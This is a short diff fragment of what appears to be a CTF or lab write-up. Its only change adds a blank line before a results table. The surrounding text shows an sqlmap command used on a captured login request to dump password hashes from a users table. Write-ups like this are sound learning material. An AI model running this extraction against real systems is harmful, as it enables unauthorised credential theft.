@@ -59,6 +59,7 @@ Saved login request after capturing it with burp suite.
 Then used sqlmap on it with sqlmap command `sqlmap -r login.req --batch -T users -C pwhash --dump`. 
 Got two user password,
 ```sql
+
 +--------------------------------------------------------------+----------+
 | pwhash                                                       | username |
 +--------------------------------------------------------------+----------+
